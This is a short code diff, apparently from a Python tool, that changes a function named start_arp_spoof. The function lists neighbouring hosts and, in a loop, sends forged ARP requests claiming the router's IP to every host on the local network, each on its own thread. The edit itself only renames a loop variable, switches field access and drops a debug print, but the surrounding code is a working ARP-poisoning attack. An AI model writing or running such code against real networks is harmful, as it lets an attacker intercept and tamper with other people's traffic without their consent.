@@ -22,15 +22,14 @@ def start_arp_spoof(router_ip='172.16.119.1'):
 	# print("final results: " + str(final_results))
 	# final_results = [{**i, **{'LAN_IP': i['LAN_IP'][1:-1]}} for i in final_results]
 	final_results = IP.neigh.show()
-	print("final results: " + str(final_results))
 
 	# loop through and poison ALL hosts
 	spoof = router_ip
 	op = 1  # Op code 1 for ARP requests
 	print("LOCAL IPS")
-	for res in final_results:
-		print("\t- " + str(res))
-		arp = ARP(op=op, psrc=spoof, pdst=res['LAN_IP'], hwdst=res['MAC_ADDRESS'])
+	for host in final_results:
+		print("\t- " + str(host))
+		arp = ARP(op=op, psrc=spoof, pdst=host.address, hwdst=host.mac_address)
 		threading.Thread(target=do_arp_spoof, args=(arp,)).start()
 
 
